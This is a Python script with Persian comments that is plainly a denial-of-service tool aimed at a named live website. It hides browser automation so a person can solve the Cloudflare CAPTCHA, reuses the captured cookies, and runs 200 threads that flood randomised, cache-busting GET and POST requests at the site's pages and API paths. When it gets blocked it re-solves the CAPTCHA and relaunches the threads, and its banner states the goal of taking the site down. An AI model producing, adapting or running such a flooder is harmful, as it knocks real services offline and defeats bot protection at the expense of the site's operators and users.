import os
import sys
import time
import json
import random
import string
import hashlib
import threading
import subprocess
from datetime import datetime

# ============================================
# نصب پکیج‌ها
# ============================================

def install_packages():
    packages = [
        "cloudscraper",
        "selenium==4.15.0",  # نسخه پایدار
        "requests",
        "fake-useragent",
        "webdriver-manager"
    ]

    for pkg in packages:
        try:
            pkg_name = pkg.split("==")[0].replace("-", "_")
            exec(f"import {pkg_name}")
        except:
            print(f"[*] نصب {pkg}...")
            os.system(f"pip install {pkg} -q")

install_packages()

# ============================================
# ایمپورت‌ها
# ============================================

import cloudscraper
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

try:
    from webdriver_manager.chrome import ChromeDriverManager
    HAS_MANAGER = True
except:
    HAS_MANAGER = False

# ============================================
# تنظیمات
# ============================================

TARGET = "https://4nayz.online"
RUNNING = True
success = 0
fail = 0
bypass_count = 0
session_cookies = {}
lock = threading.Lock()
start_time = time.time()
captcha_solved = threading.Event()

# ============================================
# نمایش بنر
# ============================================

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("""
╔══════════════════════════════════════════════════════════╗
║     💀 4NAYZ.ONLINE - BYPASS ATTACK v2 💀             ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  🎯 کروم باز میشه → کپچا حل کن → حمله شروع             ║
║  🔥 تا کپچای بعدی (حدود ۵-۱۰ دقیقه)                    ║
║  💪 ۲۰۰ ترد - سایت رو down میکنه                       ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
    """)

# ============================================
# تابع ۱: باز کردن کروم
# ============================================

def open_chrome_and_solve():
    """کروم باز میکنه و منتظر میمونه تا کپچا حل بشه"""
    global session_cookies, bypass_count

    print("\n" + "="*50)
    print("🌐 مرحله ۱: باز کردن مرورگر کروم")
    print("="*50)
    print()

    driver = None

    try:
        # تنظیمات کروم
        chrome_options = Options()
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        chrome_options.add_argument("--start-maximized")
        chrome_options.add_argument("--disable-popup-blocking")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")

        # User-Agent
        chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

        # باز کردن کروم
        if HAS_MANAGER:
            print("[*] استفاده از webdriver-manager...")
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=chrome_options)
        else:
            print("[*] استفاده از Chrome پیشفرض...")
            driver = webdriver.Chrome(options=chrome_options)

        # رفتن به سایت
        print(f"[*] رفتن به {TARGET}...")
        driver.get(TARGET)

        print(f"\n✅ کروم باز شد!")
        print(f"✅ کپچای Cloudflare رو حل کن")
        print(f"✅ بعد از حل شدن، برگرد به ترمینال")
        print()

        # صبر کن تا کاربر بگه حل کرده
        input("⏳ کپچا رو حل کردی؟ Enter بزن: ")

        # گرفتن کوکی‌ها
        print("[*] گرفتن کوکی‌ها...")
        time.sleep(2)  # صبر کوتاه

        cookies = driver.get_cookies()
        print(f"[*] {len(cookies)} کوکی پیدا شد")

        if not cookies:
            print("[!] کوکی پیدا نشد! صفحه رو رفرش میکنم...")
            driver.refresh()
            time.sleep(3)
            cookies = driver.get_cookies()
            print(f"[*] {len(cookies)} کوکی بعد از رفرش")

        # ذخیره کوکی‌ها
        session_cookies = {}
        for c in cookies:
            session_cookies[c['name']] = c['value']

        with open('cookies.json', 'w') as f:
            json.dump(session_cookies, f)

        print(f"✅ {len(session_cookies)} کوکی ذخیره شد")

        # گرفتن User-Agent
        try:
            ua = driver.execute_script("return navigator.userAgent")
            with open('user_agent.txt', 'w') as f:
                f.write(ua)
            print(f"✅ User-Agent ذخیره شد")
        except:
            pass

        # بستن کروم
        driver.quit()
        bypass_count += 1
        captcha_solved.set()

        print(f"\n✅ آماده حمله!")
        return True

    except Exception as e:
        print(f"\n❌ خطا: {e}")
        if driver:
            try:
                driver.quit()
            except:
                pass
        return False

# ============================================
# تابع ۲: تولید URL
# ============================================

def generate_url():
    paths = [
        "/", "/guess-x", "/guess-x/play", "/guess-x/bet",
        "/mines", "/mines/play", "/mines/reveal",
        "/api", "/api/v1", "/api/v1/auth",
        "/login", "/register", "/profile",
        "/moneydrop", "/survivor", "/shoot",
        "/hangtight", "/leaderboard", "/challenges"
    ]

    params = (
        ('t', str(time.time_ns())),
        ('r', hashlib.md5(str(random.random()).encode()).hexdigest()),
        ('v', str(random.randint(1, 9999))),
        ('_', str(random.randint(1, 999999999))),
        ('cache', 'false')
    )

    query = '&'.join([f"{k}={v}" for k, v in params])
    path = random.choice(paths)

    return f"{TARGET}{path}?{query}"

# ============================================
# تابع ۳: حمله
# ============================================

def attack_worker():
    global success, fail, session_cookies, RUNNING

    try:
        # خوندن User-Agent
        try:
            with open('user_agent.txt', 'r') as f:
                user_agent = f.read().strip()
        except:
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

        # ساختن اسکراپر
        scraper = cloudscraper.create_scraper(
            browser={
                'browser': 'chrome',
                'platform': 'windows',
                'desktop': True
            },
            delay=0.01
        )

        # اضافه کردن کوکی‌ها
        for name, value in session_cookies.items():
            scraper.cookies.set(name, value)

        while RUNNING:
            try:
                url = generate_url()

                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Referer': TARGET
                }

                # 30% POST, 70% GET
                if random.random() < 0.3:
                    r = scraper.post(url, headers=headers, timeout=5)
                else:
                    r = scraper.get(url, headers=headers, timeout=5)

                if r.status_code in [503, 403]:
                    with lock:
                        fail += 1
                        captcha_solved.clear()
                    break
                else:
                    with lock:
                        success += 1

            except:
                with lock:
                    fail += 1

    except:
        pass

# ============================================
# تابع ۴: نمایش آمار
# ============================================

def show_stats():
    global RUNNING, success, fail, bypass_count

    while RUNNING:
        time.sleep(2)
        elapsed = int(time.time() - start_time)
        total = success + fail
        rate = total // max(elapsed, 1)

        os.system('cls' if os.name == 'nt' else 'clear')

        print("""
╔══════════════════════════════════════════════════════════╗
║     💀 4NAYZ.ONLINE - ATTACK IN PROGRESS 💀           ║
╠══════════════════════════════════════════════════════════╣
        """)

        print(f"  ⏱ زمان: {elapsed} ثانیه           🔄 دور زدن: {bypass_count}")
        print(f"  ✅ موفق: {success:,}             ❌ خطا: {fail:,}")
        print(f"  🚀 نرخ: {rate:,}/s              📊 مجموع: {total:,}")

        if rate > 0:
            remaining = 50000 - total
            if remaining > 0:
                est_time = remaining // rate
                print(f"  ⏳ تخمین down: {est_time} ثانیه دیگه")
            else:
                print(f"  💀 سایت down شد!")

        print("""
╚══════════════════════════════════════════════════════════╝
        """)

        if not captcha_solved.is_set():
            print("  ⚠️ کپچا فعال شد! کروم باز میشه...")
        else:
            print("  [Ctrl+C برای توقف]")

# ============================================
# تابع اصلی
# ============================================

def main():
    global RUNNING, start_time

    show_banner()

    # حل کپچا
    print("📌 مرحله ۱: حل کپچا")
    print("-"*40)

    if not open_chrome_and_solve():
        print("\n❌ خطا در باز کردن کروم!")
        print("مطمئن شو Chrome نصب باشه")
        print("یا با دستور نصبش کن:")
        print("  @powershell -Command \"& {Invoke-WebRequest -Uri 'https://dl.google.com/chrome/install/latest/chrome_installer.exe' -OutFile '%TEMP%\\chrome.exe'; Start-Process -Wait -FilePath '%TEMP%\\chrome.exe' -ArgumentList '/silent /install'}\"")
        input("\nEnter بزن برای خروج...")
        sys.exit(1)

    print("\n✅ کپچا حل شد!")
    print("🚀 شروع حمله با ۲۰۰ ترد...")
    time.sleep(1)

    start_time = time.time()

    # نمایش آمار
    stats_thread = threading.Thread(target=show_stats)
    stats_thread.daemon = True
    stats_thread.start()

    # شروع کارگرها
    for i in range(200):
        w = threading.Thread(target=attack_worker)
        w.daemon = True
        w.start()

    # حلقه اصلی
    try:
        while True:
            time.sleep(1)

            # اگه کپچا فعال شد
            if not captcha_solved.is_set():
                print("\n⚠️ کپچا فعال شد!")
                time.sleep(2)

                if open_chrome_and_solve():
                    print("✅ کپچا دوباره حل شد!")
                    # کارگرهای جدید
                    for i in range(200):
                        w = threading.Thread(target=attack_worker)
                        w.daemon = True
                        w.start()

    except KeyboardInterrupt:
        print("\n\n🛑 توقف...")
        RUNNING = False

        elapsed = int(time.time() - start_time)
        total = success + fail

        print(f"""
╔══════════════════════════════════════════════════════════╗
║                    🛑 ATTACK STOPPED                    ║
╠══════════════════════════════════════════════════════════╣
║  ⏱ زمان: {elapsed} ثانیه                              ║
║  ✅ موفق: {success:,}                                  ║
║  ❌ خطا: {fail:,}                                      ║
║  🔄 دور زدن: {bypass_count}                            ║
║  📊 مجموع: {total:,}                                   ║
╚══════════════════════════════════════════════════════════╝
        """)

        input("\nEnter بزن برای خروج...")
        sys.exit(0)

# ============================================
# اجرا
# ============================================

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"\n❌ خطا: {e}")
        import traceback
        traceback.print_exc()
        input("\nEnter بزن برای خروج...")
